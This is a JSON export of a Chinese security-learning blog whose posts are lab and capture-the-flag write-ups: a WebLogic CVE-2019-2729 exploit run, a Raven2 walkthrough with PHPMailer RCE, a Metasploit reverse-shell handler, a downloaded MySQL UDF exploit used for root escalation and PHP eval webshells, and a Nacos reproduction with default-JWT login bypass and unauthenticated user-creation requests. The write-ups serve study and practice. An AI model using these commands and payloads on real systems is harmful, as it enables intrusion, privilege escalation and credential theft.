{"meta":{"title":"J3fffff's Blog","subtitle":"","description":"","author":"Jeff","url":"https://j3f5.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-05-22T08:59:44.739Z","updated":"2023-05-22T08:59:44.739Z","comments":false,"path":"/404.html","permalink":"https://j3f5.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-06-05T01:26:18.489Z","updated":"2023-06-05T01:26:18.489Z","comments":false,"path":"about/index.html","permalink":"https://j3f5.github.io/about/index.html","excerpt":"","text":"此文档收录比较有用的资源链接 目前的方向 java审计（先把700集的java基础看完（速通一周），然后再上手其他，注意java-EE的使用） WAF初识 安卓取证与对应攻击 车联网渗透基础 web渗透基础（看小迪和暗月的教程+看国外有什么点可以打，冲，最好挂个代理） 优秀课程 全套渗透 小迪安全 笔记1：https://www.yuque.com/gemaxianrenhm/hahwdw 笔记2：https://www.cnblogs.com/SnowSec/category/1908585.html 笔记3：https://blog.csdn.net/mctsog/category_11584480_2.html 暗月渗透 知识论坛 全面 CN-SEC中文网：https://cn-sec.com/ IOT IOTsec-Zone：https://iotsec-zone.com/ 知识库 大类库 https://github.com/YinWC/Security_Learning"},{"title":"分类","date":"2023-05-22T08:59:44.741Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"categories/index.html","permalink":"https://j3f5.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-05-22T10:10:32.005Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"books/index.html","permalink":"https://j3f5.github.io/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":false,"path":"repository/index.html","permalink":"https://j3f5.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":true,"path":"links/index.html","permalink":"https://j3f5.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-05-22T08:59:44.743Z","updated":"2023-05-22T08:59:44.743Z","comments":false,"path":"tags/index.html","permalink":"https://j3f5.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"红队靶场-2","slug":"红队靶场-2","date":"2023-06-30T06:19:36.000Z","updated":"2023-06-30T06:19:36.000Z","comments":true,"path":"articles/2023/06/30/红队靶场-2/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/30/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-2/","excerpt":"","text":"基础环境设置 主要练习 Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。 Bypass UAC Windows系统NTLM获取（理论知识：Windows认证） Access Token利用（MSSQL利用） WMI利用 网页代理，二层代理，特殊协议代理（DNS，ICMP） 域内信息收集 域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用 域凭证收集 后门技术（黄金票据/白银票据/Sid History/MOF） 环境设置 密码统一为：1qaz@WSX 内网网段：10.10.10.1/24。这个设置NAT网段，所以NAT为10.10.10.0/24 DMZ网段：10.131.210.1/24。因为用的另一个笔记本进行攻击，所以，使用桥接模式，这个DMZ段的网址是路由器决定的，需要改。 测试机地址：10.131.210.104（Windows），10.131.210.172（Linux） 所以这些虚拟机的“外网”IP为： DC IP：10.10.10.10 OS：Windows 2012(64) 应用：AD域 WEB IP1：10.10.10.80 IP2：10.131.210.32 OS：Windows 2008(64) 应用：Weblogic 10.3.6 MSSQL 2008 扫了一遍发现没有开weblogic，那就开一下，进去之后搜索weblogic即可 PC IP1：10.10.10.201 IP2：10.131.210.194 OS：Windows 7(32) 信息搜集 扫网段就不扫了，我们知道有一个IP，10.131.210.32，发现端口：80、135、139、445、1433、3389、7001、49152、49153、49154、49155、49157、49158。是windows主机 域信息 1234567| Target_Name: DE1AY| NetBIOS_Domain_Name: DE1AY| NetBIOS_Computer_Name: WEB| DNS_Domain_Name: de1ay.com| DNS_Computer_Name: WEB.de1ay.com| DNS_Tree_Name: de1ay.com| Product_Version: 6.1.7601 MSSQL的版本 12| name: Microsoft SQL Server 2008 R2 SP2| number: 10.50.4000.00 weblogic版本 1Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; 80端口信息 1open http Microsoft IIS httpd 7.5 解析漏洞，没有看见网页（上传地址）没办法利用 服务器信息 1Microsoft Windows Server 2008 R2 - 2012 其他端口信息 135 通过135端口入侵实际上是利用RPC漏洞来攻击计算机的。一般情况下135端口主要用于使用RPC（Remote Procedure Call，远程过程调用） 139 存在Samba服务，可能存在爆破/未授权访问/远程命令执行漏洞。他是NetBIOS Session Service设备提供的辅助端口，是用于提供Windows文件和打印机共享文件的重要连接方式 445 smb服务，可能存在ms17_010永恒之蓝漏洞。139和445存在，为ipc和smb的利用提供了条件。 Weblogic Weblogic scan 这里有两个脚本，一个是原始的，不好用，探测不出来： https://github.com/rabbitmask/WeblogicScan 一个是修改过的，这个好用： https://github.com/dr0op/WeblogicScan 还有个利用工具： https://github.com/KimJun1010/WeblogicTool 探测到的信息有： 123456789101112131415161718192021Welcome To WeblogicScan !![*]开始检测 weblogic-console[+]The target Weblogic console address is exposed![+]The path is: http://10.131.210.32:7001/console/login/LoginForm.jsp [+]Please try weak password blasting! [+]Weblogic后台路径存在[*]开始检测 SSRF[+]The target Weblogic UDDI module is exposed![+]The path is: http://10.131.210.32:7001/uddiexplorer/ [+]Please verify the SSRF vulnerability! [+]SSRF 漏洞存在[*]开始检测 CVE20192725[-]CVE20192725 未成功检测，请检查网络连接或或目标存在负载中间件[*]开始检测 CVE20192729[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2729[+]CVE-2019-2729 漏洞存在[*]开始检测 CVE201710271[-]Target weblogic not detected CVE-2017-10271[*]开始检测 CVE20173506[+]The target weblogic has a JAVA deserialization vulnerability:CVE-2017-3506[+]CVE-2017-3506 漏洞存在 CVE-2019-2729 漏洞存在，这个是反序列化漏洞，可以执行RCE CVE-2017-3506 漏洞存在，这个是wls-wsat组件远程命令执行，与2017-10271类似 利用CVE-2019-2729 https://github.com/ruthlezs/CVE-2019-2729-Exploit 1234┌──(j3fffff㉿j3fffff)-[~/Mywork/Tools/WeblogicScan/CVE-2019-2729-Exploit]└─$ python oracle-weblogic-deserialize.py -u http://10.131.210.32:7001/ -c chdir[+] Send Request to : http://10.131.210.32:7001//wls-wsat/CoordinatorPortType[+] Response : C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain 尝试写一个木马进去，或者反弹shell也行。","categories":[],"tags":[]},{"title":"打靶-Raven2","slug":"打靶-Raven2","date":"2023-06-28T02:07:36.000Z","updated":"2023-06-28T02:07:36.000Z","comments":true,"path":"articles/2023/06/28/打靶-Raven2/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/28/%E6%89%93%E9%9D%B6-Raven2/","excerpt":"","text":"资产搜索&amp;信息搜集 先用Masscan，扫一下，因为知道有网页，所以直接指定端口了，很快就有结果了： 123456789101112┌──(j3fffff㉿j3fffff)-[~]└─$ sudo masscan 10.131.210.0/24 --ports 80[sudo] password for j3fffff: Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-06-26 04:30:34 GMTInitiating SYN Stealth ScanScanning 256 hosts [1 port/host]Discovered open port 80/tcp on 10.131.210.39 这个才是Discovered open port 80/tcp on 10.131.210.134 这个是Canon打印机 Discovered open port 80/tcp on 10.131.210.9 H3CwifiDiscovered open port 80/tcp on 10.131.210.1 Discovered open port 80/tcp on 10.131.210.59 Discovered open port 80/tcp on 10.131.210.65 访问不了 找到机器了，那么就访问网页，发现是这样的： 还是用nmap扫一下，是linux系统： 1234567891011121314151617181920212223sudo nmap -sS -A -p- 10.131.210.39 PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)| 2048 315801194da280a6b90d40981c97aa53 (RSA)| 256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)|_ 256 0e8571a8a2c308699c91c03f8418dfae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-title: Raven Security|_http-server-header: Apache/2.4.10 (Debian)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 37669/udp6 status| 100024 1 44486/udp status| 100024 1 51551/tcp status|_ 100024 1 52741/tcp6 status51551/tcp open status 1 (RPC #100024) 使用burp抓包，随便点一下，发现一些URL： 不够，再用dirb扫一下，发现目录：vendor 分别打开，PATH，内容有网站的目录以及一个flag： 12/var/www/html/vendor/flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125; 再打开：SECURITY、VERSION，发现： 1234## Version 5.2.17 (December 9th 2016)* This is officially the last feature release of 5.2. Security fixes only from now on; use PHPMailer 6.0!PHPMailer versions prior to 5.2.18 (released December 2016) are vulnerable to [CVE-2016-10033](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10033) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com). 发现phpmail漏洞，上面有wordpress，使用wpscan扫一下，发现了upload目录，其他的好像没啥用： PHPMAIL漏洞RCE-getshell 去找存在Phpmail的页面，一般存在于mail联系等，所以就是contact.php了。 发现使用这个exp没办法成功，所以换一个exp：40974.py 更改一些配置，例如攻击的页面等，然后执行脚本，访问contact.php，再访问shell.php 弄好了就直接打 访问一下contact.php，他就生成shell，在msf开个监听，然后打开10.131.210.39/shell.php： 12345678910msfconsolemsf6 post(multi/manage/shell_to_meterpreter) &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; show options...Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port 设置一下LHOST即可，可以自己设置payload，现在用不到，等着返回，就可以拿到了shell，然后引入meterpreter进行后渗透 123backgrounduse post/multi/manage/shell_to_meterpretersession 1 成功，可以进行后渗透 渗透提权 先进行信息搜集，上传LinEnum.sh 1meterpreter# upload LinuEnum.sh /var/www/html/LinuEnum.sh 扫一下，将至重定向到一个文件，看文件，发现存在Mysql：mysql Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3，好了，应该可以用它来提权，得先知道他的用户名密码，所以一顿查找： 12345find /var/www -name *config*/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php/var/www/html/wordpress/wp-admin/setup-config.php/var/www/html/wordpress/wp-config.php/var/www/html/wordpress/wp-config-sample.php 找到了，在/var/www/html/wordpress/wp-config.php： 123456/** MySQL database username */define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);/** MySQL database password */define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);/** MySQL hostname */define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;); 用msf链接数据库，使用UDF提权试试看： 123456789101112131415mysql -u root -pEnter password: R@v3nSecuritymysql&gt; select @@basedir;+-----------+| @@basedir |+-----------+| /usr |+-----------+mysql&gt; select @@version;+-----------------+| @@version |+-----------------+| 5.5.60-0+deb8u1 |+-----------------+ 下载UDF，编译一下： 12345wget https://www.exploit-db.com/download/1518mv 1518 raptor_udf.cgcc -g -c raptor_udf.cgcc -g -shared -o raptor_udf.so raptor_udf.o -mv raptor_udf.so udf.so 操作！ 123456789use mysqlcreate table ha4k(line blob);insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));# 输出恶意soselect * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;# 创建函数create function do_system returns integer soname &#x27;1518.so&#x27;;select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);&lt;mod u+s /usr/bin/find&#x27;); 全部都OK，后面查找特权命令：find / -user root -perm 4000 -print 2 &gt; /dev/null OKOK，提权成功！ 全局找Flag: 12345# find / -name flag*/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png/var/www/flag2.txt/root/flag4.txt# cat /root/flag4.txt 备注 命令行写shell出错 他是反弹shell，所以开启：nc -lvp 4444，接受到了，尝试写一个一句话木马： 1echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php 发现了一些错误： 123456789101112131415$ echo &#x27;&lt;?php eval($_GET[&#x27;Jeff&#x27;]);?&gt;&#x27; &gt; bdoor.php$ cat bdoor.php&lt;?php eval($_GET[Jeff]);?&gt;$ echo &#x27;&lt;?php eval($_GET[\\&#x27;Jeff\\&#x27;]);?&gt;&#x27; &gt; bdoor.php /bin/sh: 5: Syntax error: &quot;)&quot; unexpected$ echo &quot;&lt;?php eval($_GET[&#x27;X&#x27;]);?&gt;&quot; &gt; bdoor.php$ cat bdoor.php&lt;?php eval([&#x27;X&#x27;]);?&gt;$ echo &#x27;&lt;?php @eval($_POST[\\&#x27;h4ck\\&#x27;]) ?&gt;&#x27; &gt; bdoor.php/bin/sh: 7: Syntax error: &quot;)&quot; unexpected$ cat bdoor.php &lt;?php eval([&#x27;X&#x27;]);?&gt;$ echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php$ cat 1.php&lt;?php eval($_POST[x]);?&gt; 他竟然吞字符。。。 小彩蛋 发现里面有contact.zip，可以下下来，自己看看里面有啥，这也是思路","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"打靶","slug":"渗透测试/打靶","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"https://j3f5.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"}]},{"title":"nacos复现","slug":"nacos复现","date":"2023-06-26T12:22:04.000Z","updated":"2023-06-27T12:22:04.000Z","comments":true,"path":"articles/2023/06/26/nacos复现/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/26/nacos%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"基本信息 使用的是在线靶场：https://hack.zkaq.cn/battle/target?id=1496966ab0f410bd 这个靶场是2020的，漏洞差不多也是那个时候吧。根据大佬的提示，看能不能通过这个靶场练习一下： 探测hessian版本、nacos版本 能否拉出依赖 开始之前，还是得看一下官方文档。 Nacos Nacos /nɑ:kəʊs/ 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。 Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。 Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。 参考：https://nacos.io/zh-cn/docs/what-is-nacos.html 鉴权 总结有几点： 非docker安装默认关闭鉴权，打开配置application.properties如下 123456### If turn on auth system:nacos.core.auth.enabled=false### If turn on auth system:nacos.core.auth.system.type=nacosnacos.core.auth.enabled=true 开启鉴权后，配置application.properties默认密钥： 12### The default token(Base64 String):nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 自定义密钥时，推荐将配置项设置为Base64编码的字符串，注意：鉴权开关是修改之后立马生效的，不需要重启服务端。 鉴权采用JWT token，弱用户名密码：nacos/nacos 12345curl -X POST &#x27;127.0.0.1:8848/nacos/v1/auth/login&#x27; -d &#x27;username=nacos&amp;password=nacos&#x27;# Success！&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyOTE2Nn0.2TogGhhr11_vLEjqKko1HJHUJEmsPuCxkur-CfNojDo&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;# 随后操作配置需要带上accessTokencurl -X GET &#x27;127.0.0.1:8848/nacos/v1/cs/configs?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYwNTYyMzkyM30.O-s2yWfDSUZ7Svd3Vs7jy9tsfDNHs1SuebJB4KlNY8Q&amp;dataId=nacos.example.1&amp;group=nacos_group&#x27; API调用 配置： 1curl -X GET &#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27; 查询配置历史版本： 1curl -X GET &#x27;http://127.0.0.1:8848/nacos/v1/cs/history?search=accurate&amp;dataId=nacos.example&amp;group=com.alibaba.nacos&#x27; 至于详情/上一个版本的配置信息，则需要提供更多的信息 服务发现/实例 12345curl -X POST &#x27;http://127.0.0.1:8848/nacos/v1/ns/instance?port=8848&amp;healthy=true&amp;ip=11.11.11.11&amp;weight=1.0&amp;serviceName=nacos.test.3&amp;encoding=GBK&amp;namespaceId=n1&#x27;# 列表curl -X GET &#x27;127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.test.1&#x27;# 实情curl -X GET &#x27;127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.test.2&amp;ip=10.10.10.10&amp;port=8888&amp;cluster=DEFAULT&#x27; 查询服务 123curl -X GET &#x27;127.0.0.1:8848/nacos/v1/ns/service?serviceName=nacos.test.2&#x27;# 列表curl -X GET &#x27;127.0.0.1:8848/nacos/v1/ns/service/list?pageNo=1&amp;pageSize=2&#x27; 查询命名空间 1curl -X GET &#x27;http://localhost:8848/nacos/v1/console/namespaces&#x27; 历史漏洞 信息泄漏 未登录，访问URL，可以获得默认安装后泄漏的内网IP地址 1http://ip:8848/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword 未登录，访问URL，可以获得默认安装后的用户列表 1http://ip:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9 任意用户创建 访问http://your-ip:8848/nacos/v1/auth/users。利用POST传参，此处的参数为username=test&amp;password=test，修改User-Agent头为Nacos-Server。发送POST请求，返回码200，成功创建test用户。 1curl -X POST &#x27;http://192.168.244.123:8848/nacos/v1/auth/users?username=test1&amp;password=test1 任意用户密码更改 1curl -X PUT &#x27;http://your-ip:8848/nacos/v1/auth/users?accessToken=&#x27; -H &#x27;User-Agent:Nacos-Server&#x27; -d &#x27;username=test1&amp;newPassword=test2&#x27; 后台未授权登录 漏洞主要由于NACOS使用了默认的JWT key导致的未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名和密码验证直接登录到nacos用户后台。 poc： 123456789101112131415HTTP/1.1 200Server: nginx/1.19.6Date: Sun, 11 Apr 2021 01:48:17 GMTContent-Type: application/json;charset=UTF-8Connection: closeVary: OriginVary: Access-Control-Request-MethodVary: Access-Control-Request-HeadersAccess-Control-Allow-Origin: http://47.93.46.78:9090Access-Control-Allow-Credentials: trueAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNAContent-Length: 162&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125; 发送这个包过去即可 使用Spring Boot获得账号密码 参考：https://blog.csdn.net/qq_45161658/article/details/122848419 反序列化漏洞 影响版本 1.4.0 &lt;= Nacos &lt; 1.4.6 2.0.0 &lt;= Nacos &lt; 2.2.3 参考： https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian反序列化漏洞分析/ https://www.freebuf.com/vuls/224280.html 只能打一次，与协议有关，需要探测hessian版本，拉出依赖。 修复 在1.2~1.4.0版本期间，通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端，UA头中包含Nacos-Server就可以通过认证访问需要鉴权的接口。所以第一个就是获取其版本。 从1.4.1版本开始，Nacos添加服务身份识别功能，用户可以自行配置服务端的Identity，不再使用User-Agent作为服务端请求的判断标准。 配置文件中JWT默认key上面说到了。可以使用JWT章节介绍的来延长JWT过期时间。 开启auth的汇总 UA头中包含Nacos-Server 1curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;User-Agent: Nacos-Server&quot; 默认自定义身份识别标志 1curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;serverIdentity: security&quot; 账户信息 JWT accessToken 1curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&amp;username=nacos&amp;password=nacos&quot; accessToken 利用Authorization登录： 1curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users/login&quot; -X POST -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTk5NTQzODEyOH0.KSFTu7Cwi3ofgclAFImctUHZERZj6WavjlH37db1FTY&quot; -d &quot;username=nacos&amp;password=1&quot; 实践 nacos版本、敏感信息 呵呵哈哈哈，狂点登录窗口的左上角标志，一直点，可能会偶然进入后台（闪现），就可以看到版本了，呵呵哈哈哈，闪了一下他就退出了。 版本信息 META-INF, 相当于一个信息包，用于存放一些meta information相关的文件。用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。 在使用/env接口获取环境列表后，搜索：META-INF或者BOOT-INF可以看到： 如果搜索：version，就会有：参考：https://www.cnblogs.com/allenwas3/p/12145524.html 那是不是就不可以获取了？ /env接口获取环境列表，并使用/heapdump下载查看关键信息 使用dirsearch可以看到一些未授权接口：dirseach.py -u &lt;ip:port&gt; -r。重要的信息泄漏有：/env和/heapdump接口。 /env接口：会生成应用程序可用的所有环境属性的列表，无论这些属性是否用到。这其中包括环境变量、JVM 属性、命令行参数，以及 application.properties 或 application.yml 文件提供的属性。 /heapdump接口：当访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret、key等)的属性名对应的属性值用 * 号替换达到脱敏的效果。而此时若是想要找到想要获取的被星号 * 遮掩的属性值对应的属性名可以通过下载heapdump 文件从其中获取信息。heapdump是系统自动生成一个 Jvm 的堆文件，该文件保存了某一时刻JVM堆中对象使用情况，也可能包含着一些密码属性，通过对该文件进行解读可以从获取到nacos的密码。使用MemoryAnalyzer内存查看工具 url访问：http://glkb-qkj2.aqlab.cn/nacos/actuator/env 或者使用curl：curl -X GET 'http://glkb-qkj2.aqlab.cn/nacos/actuator/env' 看到这里面有密码，访问： url访问：http://glkb-qkj2.aqlab.cn/nacos/actuator/heapdump 放到MemoryAnalyzer中看： 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 尝试获得内网IP 12curl &#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword&#x27;&#123;&quot;code&quot;:200,&quot;message&quot;:null,&quot;data&quot;:[&#123;&quot;ip&quot;:&quot;10.0.0.53&quot;,&quot;port&quot;:8848,&quot;state&quot;:&quot;UP&quot;,&quot;extendInfo&quot;:&#123;&quot;adWeight&quot;:&quot;0&quot;,&quot;lastRefreshTime&quot;:1685783927892,&quot;raftMetaData&quot;:&#123;&quot;metaDataMap&quot;:&#123;&quot;naming_instance_metadata&quot;:&#123;&quot;leader&quot;:&quot;10.0.0.53:7848&quot;,&quot;raftGroupMember&quot;:[&quot;10.0.0.53:7848&quot;],&quot;term&quot;:1&#125;,&quot;naming_service_metadata&quot;:&#123;&quot;leader&quot;:&quot;10.0.0.53:7848&quot;,&quot;raftGroupMember&quot;:[&quot;10.0.0.53:7848&quot;],&quot;term&quot;:1&#125;&#125;&#125;,&quot;raftPort&quot;:&quot;7848&quot;,&quot;remoteConnectType&quot;:&quot;GRPC&quot;,&quot;site&quot;:&quot;unknow&quot;,&quot;version&quot;:&quot;2.0.0-ALPHA.1&quot;,&quot;weight&quot;:&quot;1&quot;&#125;,&quot;address&quot;:&quot;10.0.0.53:8848&quot;,&quot;failAccessCnt&quot;:0&#125;]&#125; 默认安装后泄漏的用户列表 12curl &#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9&#x27;&#123;&quot;totalCount&quot;:1,&quot;pageNumber&quot;:1,&quot;pagesAvailable&quot;:1,&quot;pageItems&quot;:[&#123;&quot;username&quot;:&quot;nacos&quot;,&quot;password&quot;:&quot;$2a$10$B3Y43jNaOC3Ie4gRg/ZqpeRl1AGA.ZRpWxB1Lz3RnLb4XM6coVooa&quot;&#125;]&#125; 鉴权 未授权登录 操作： 打开登录页面，随便输入帐号密码，抓包，右击，do intercept，截获返回的数据包，点击forward 得到结果： 删除这个框的内容，加上上面的POC，发送即可成功登录。 任意创建用户 1234567891011121314POST /nacos/v1/auth/users HTTP/1.1Host: ip:8848User-Agent: Nacos-ServerAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Type: application/x-www-form-urlencodedContent-Length: 29username=test&amp;password=test 使用apipost发送一下。 然而登录进去就有flag 更改用户 注意data中的键是newPassword，提交方式是PUT 获取服务信息/版本/集群列表/ 根据上面的api接口，尝试一下。 查看存在的server，这里走list。 其实这算是成功了，靶机里面没啥服务，所以没探出来。 查看存在的Servlet集群，路径是：/nacos/v1/ns/operator/servers 1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;servers&quot;: [ &#123; &quot;ip&quot;: &quot;10.0.0.53&quot;, &quot;port&quot;: 8848, &quot;state&quot;: &quot;UP&quot;, &quot;extendInfo&quot;: &#123; &quot;adWeight&quot;: &quot;0&quot;, &quot;lastRefreshTime&quot;: 1685783927892, &quot;raftMetaData&quot;: &#123; &quot;metaDataMap&quot;: &#123; &quot;naming_instance_metadata&quot;: &#123; &quot;leader&quot;: &quot;10.0.0.53:7848&quot;, &quot;raftGroupMember&quot;: [ &quot;10.0.0.53:7848&quot; ], &quot;term&quot;: 1 &#125;, &quot;naming_service_metadata&quot;: &#123; &quot;leader&quot;: &quot;10.0.0.53:7848&quot;, &quot;raftGroupMember&quot;: [ &quot;10.0.0.53:7848&quot; ], &quot;term&quot;: 1 &#125; &#125; &#125;, &quot;raftPort&quot;: &quot;7848&quot;, &quot;remoteConnectType&quot;: &quot;GRPC&quot;, &quot;site&quot;: &quot;unknow&quot;, &quot;version&quot;: &quot;2.0.0-ALPHA.1&quot;, &quot;weight&quot;: &quot;1&quot; &#125;, &quot;address&quot;: &quot;10.0.0.53:8848&quot;, &quot;failAccessCnt&quot;: 0 &#125; ]&#125; 另外，访问集群Leader：/nacos/v1/ns/raft/leader，这个不测了 测命名空间： 12345678910111213141516http://glkb-qkj2.aqlab.cn/nacos/v1/console/namespaces# orhttp://glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace&#123; &quot;code&quot;: 200, &quot;message&quot;: null, &quot;data&quot;: [ &#123; &quot;namespace&quot;: &quot;&quot;, &quot;namespaceShowName&quot;: &quot;public&quot;, &quot;quota&quot;: 200, &quot;configCount&quot;: 1, &quot;type&quot;: 0 &#125; ]&#125; 读取配置文件 使用apipost，设置Host为Nacos-Server，发送GET请求： 12345678910111213141516171819202122http://glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99# orhttp://glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99# or导出http://glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=&#123; &quot;totalCount&quot;: 1, &quot;pageNumber&quot;: 1, &quot;pagesAvailable&quot;: 1, &quot;pageItems&quot;: [ &#123; &quot;id&quot;: &quot;639026079587323904&quot;, &quot;dataId&quot;: &quot;flag&quot;, &quot;group&quot;: &quot;DEFAULT_GROUP&quot;, &quot;content&quot;: &quot;8948791476&quot;, &quot;md5&quot;: null, &quot;tenant&quot;: &quot;&quot;, &quot;appName&quot;: &quot;&quot;, &quot;type&quot;: null &#125; ]&#125;","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[]},{"title":"内网安全","slug":"内网安全","date":"2023-06-26T02:32:30.000Z","updated":"2023-07-05T02:32:30.000Z","comments":true,"path":"articles/2023/06/26/内网安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/","excerpt":"","text":"概念 